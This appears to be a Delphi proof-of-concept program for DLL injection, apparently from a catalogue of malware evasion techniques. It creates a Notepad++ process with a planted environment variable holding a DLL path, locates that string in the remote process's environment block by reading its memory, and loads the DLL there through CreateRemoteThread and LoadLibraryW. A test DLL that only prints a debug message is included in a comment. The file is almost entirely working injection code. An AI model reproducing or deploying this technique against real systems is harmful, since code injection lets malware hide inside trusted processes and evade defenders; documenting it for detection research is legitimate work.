(*
    Example of DLL Code to test DLL Injection:
    ------------------------------------------

    BOF>>

    library UnprotectTestDLL;

          uses
            WinApi.Windows,
            System.SysUtils,
            System.Classes;

          {$R *.res}

          procedure DllMain(AReason: Integer);
          var AMessage   : String;
              AStrReason : String;
          begin
            case AReason of
              DLL_PROCESS_DETACH : AStrReason := 'DLL_PROCESS_DETACH';
              DLL_PROCESS_ATTACH : AStrReason := 'DLL_PROCESS_ATTACH';
              DLL_THREAD_ATTACH  : AStrReason := 'DLL_THREAD_ATTACH';
              DLL_THREAD_DETACH  : AStrReason := 'DLL_THREAD_DETACH';
              else
                AStrReason := 'REASON_UNKNOWN';
            end;

            AMessage := Format('(%s): Injected! Living in %d (%s) process.', [
              AStrReason,
              GetCurrentProcessId(),
              ExtractFileName(GetModuleName(0))
            ]);
            ///

            OutputDebugStringW(PWideChar(AMessage));
          end;

          begin
            DllProc := DllMain;
            DllMain(DLL_PROCESS_ATTACH)


    <<EOF
*)

// Support both x86-32 and x86-64

program ProcEnvInjection_DLLInjection;

{$APPTYPE CONSOLE}

{$R *.res}

uses
  Winapi.Windows,
  System.Math,
  System.SysUtils;

type
  EWindowsException = class(Exception)
  private
    FLastError : Integer;
  public
    {@C}
    constructor Create(const WinAPI : String); overload;

    {@G}
    property LastError : Integer read FLastError;
  end;

  {$IFDEF WIN64}
    PProcessBasicInformation = ^TProcessBasicInformation;
    TProcessBasicInformation = record
    ExitStatus         : Int64;
    PebBaseAddress     : Pointer;
    AffinityMask       : Int64;
    BasePriority       : Int64;
    UniqueProcessId    : Int64;
    InheritedUniquePID : Int64;
    end;
  {$ELSE}
    PProcessBasicInformation = ^TProcessBasicInformation;
    TProcessBasicInformation = record
    ExitStatus         : DWORD;
    PebBaseAddress     : Pointer;
    AffinityMask       : DWORD;
    BasePriority       : DWORD;
    UniqueProcessId    : DWORD;
    InheritedUniquePID : DWORD;
    end;
  {$ENDIF}

  UNICODE_STRING = record
    Length        : Word;
    MaximumLength : Word;
    Buffer        : LPWSTR;
  end;

  CURDIR = record
    DosPath : UNICODE_STRING;
    Handle  : THandle;
  end;

  RTL_DRIVE_LETTER_CURDIR = record
    Flags     : Word;
    Length    : Word;
    TimeStamp : ULONG;
    DosPath   : UNICODE_STRING;
  end;

  TRTLUserProcessParameters = record
    MaximumLength      : ULONG;
    Length             : ULONG;
    Flags              : ULONG;
    DebugFlags         : ULONG;
    ConsoleHandle      : THANDLE;
    ConsoleFlags       : ULONG;
    StandardInput      : THANDLE;
    StandardOutput     : THANDLE;
    StandardError      : THANDLE;
    CurrentDirectory   : CURDIR;
    DllPath            : UNICODE_STRING;
    ImagePathName      : UNICODE_STRING;
    CommandLine        : UNICODE_STRING;
    Environment        : Pointer;
    StartingX          : ULONG;
    StartingY          : ULONG;
    CountX             : ULONG;
    CountY             : ULONG;
    CountCharsX        : ULONG;
    CountCharsY        : ULONG;
    FillAttribute      : ULONG;
    WindowFlags        : ULONG;
    ShowWindowFlags    : ULONG;
    WindowTitle        : UNICODE_STRING;
    DesktopInfo        : UNICODE_STRING;
    ShellInfo          : UNICODE_STRING;
    RuntimeData        : UNICODE_STRING;
    CurrentDirectories : array [0 .. 32-1] of RTL_DRIVE_LETTER_CURDIR;
  end;
  PRTLUserProcessParameters = ^TRTLUserProcessParameters;

  TPEB = record
    Reserved1              : array [0..2-1] of Byte;
    BeingDebugged          : Byte;
    Reserved2              : Byte;
    Reserved3              : array [0..2-1] of Pointer;
    Ldr                    : Pointer;
    ProcessParameters      : PRTLUserProcessParameters;
    Reserved4              : array [0..103-1] of Byte;
    Reserved5              : array [0..52-1] of Pointer;
    PostProcessInitRoutine : Pointer;
    Reserved6              : array [0..128-1] of byte;
    Reserved7              : Pointer;
    SessionId              : ULONG;
  end;
  PPEB = ^TPEB;

function NtQueryInformationProcess(
  ProcessHandle : THandle;
  ProcessInformationClass : DWORD;
  ProcessInformation : Pointer;
  ProcessInformationLength : ULONG;
  ReturnLength : PULONG
): LongInt; stdcall; external 'ntdll.dll';

const PROCESS_BASIC_INFORMATION = 0;

constructor EWindowsException.Create(const WinAPI : String);
var AFormatedMessage : String;
begin
  FLastError := GetLastError();

  AFormatedMessage := Format('___%s: last_err=%d, last_err_msg="%s".', [
      WinAPI,
      FLastError,
      SysErrorMessage(FLastError)
  ]);

  ///
  inherited Create(AFormatedMessage);
end;

function RandomString(ALength : Word) : String;
const AChars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
var I : Integer;
begin
  result := '';
  ///

  randomize;

  for I := 1 to ALength do begin
      result := result + AChars[random(length(AChars))+1];
  end;
end;


function InjectDLL(const ADLLPath : String; AHostApplication: String; const AEggLength : Cardinal = 5) : Boolean;
var AStartupInfo              : TStartupInfo;
    AProcessInfo              : TProcessInformation;
    AEnvLen                   : Cardinal;
    pEnvBlock                 : Pointer;
    ARetLen                   : Cardinal;
    PBI                       : TProcessBasicInformation;
    APEB                      : TPEB;
    ABytesRead                : SIZE_T;
    ARTLUserProcessParameters : TRTLUserProcessParameters;
    i                         : Integer;
    pOffset                   : Pointer;
    APayloadEgg               : String;
    APayloadEnv               : String;
    ABuffer                   : array of byte;
    pPayloadOffset            : Pointer;
    AThreadId                 : Cardinal;
begin
  ZeroMemory(@AStartupInfo, SizeOf(TStartupInfo));
  AStartupInfo.cb := SizeOf(TStartupInfo);

  ZeroMemory(@AProcessInfo, SizeOf(TProcessInformation));

  result := False;

  APayloadEgg := RandomString(AEggLength);
  APayloadEnv := Format('%s=%s', [APayloadEgg, ADLLPath]);

  AEnvLen := (Length(APayloadEnv) * SizeOf(WideChar));

  GetMem(pEnvBlock, AEnvLen);
  try
    ZeroMemory(pEnvBlock, AEnvLen);
    Move(PWideChar(APayloadEnv)^, pEnvBlock^, AEnvLen);
    ///

    UniqueString(AHostApplication);

    if not CreateProcessW(
        PWideChar(AHostApplication),
        nil,
        nil,
        nil,
        False,
        CREATE_NEW_CONSOLE or CREATE_UNICODE_ENVIRONMENT,
        pEnvBlock,
        nil,
        AStartupInfo,
        AProcessInfo
    ) then
      raise EWindowsException.Create('CreateProcessW');

    // Tiny trick to be sure new process is completely initailized.
    // Remove bellow if you find it problematic.
    WaitForInputIdle(AProcessInfo.hProcess, INFINITE);

    if NtQueryInformationProcess(
        AProcessInfo.hProcess,
        PROCESS_BASIC_INFORMATION,
        @PBI,
        SizeOf(TProcessBasicInformation),
        @ARetLen
    ) <> ERROR_SUCCESS then
      raise EWindowsException.Create('NtQueryInformationProcess');

    if not ReadProcessMemory(
        AProcessInfo.hProcess,
        PBI.PebBaseAddress,
        @APEB,
        SizeOf(TPEB),
        ABytesRead
    ) then
      raise EWindowsException.Create('ReadProcessMemory');

    if not ReadProcessMemory(
        AProcessInfo.hProcess,
        APEB.ProcessParameters,
        @ARTLUserProcessParameters,
        SizeOf(TRTLUserProcessParameters),
        ABytesRead
    ) then
      raise EWindowsException.Create('ReadProcessMemory');

    // Scan Environment Variable Memory Block
    I := 0;

    SetLength(ABuffer, AEggLength * SizeOf(WideChar));

    pPayloadOffset := nil;

    while true do begin
      pOffset := Pointer(NativeUInt(ARTLUserProcessParameters.Environment) + I);
      ///

      if not ReadProcessMemory(
          AProcessInfo.hProcess,
          pOffset,
          @ABuffer[0],
          Length(ABuffer),
          ABytesRead
      ) then
        raise EWindowsException.Create('ReadProcessMemory');

      if CompareMem(PWideChar(ABuffer), PWideChar(APayloadEgg), Length(ABuffer)) then begin
        pPayloadOffset := Pointer(NativeUInt(pOffset) + Length(ABuffer) + SizeOf(WideChar) { =\0 });

        break;
      end;

      Inc(I, 2);
    end;

    SetLength(ABuffer, 0);

    if not Assigned(pPayloadOffset) then
      raise Exception.Create('Could not locate Injected DLL Path offset from remote process environment.');

    // Debug, read DLL path from remote process
//    SetLength(ABuffer, AEnvLen - (5 * SizeOf(WideChar)));
//    ReadProcessMemory(
//        AProcessInfo.hProcess,
//        pPayloadOffset,
//        @ABuffer[0],
//        Length(ABuffer),
//        ABytesRead
//    );
//    WriteLn(PWideChar(ABuffer));

    // Start DLL Injection
    if CreateRemoteThread(
        AProcessInfo.hProcess,
        nil,
        0,
        GetProcAddress(GetModuleHandle('Kernel32.dll'), 'LoadLibraryW'),
        pPayloadOffset,
        0,
        AThreadId
    ) = 0 then
      raise EWindowsException.Create('CreateRemoteThread');
  finally
    FreeMem(pEnvBlock, AEnvLen);
  end;
end;

begin
  try
    InjectDLL('C:\Temp\UnprotectTestDLL.dll', 'C:\Program Files\Notepad++\notepad++.exe');
  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end.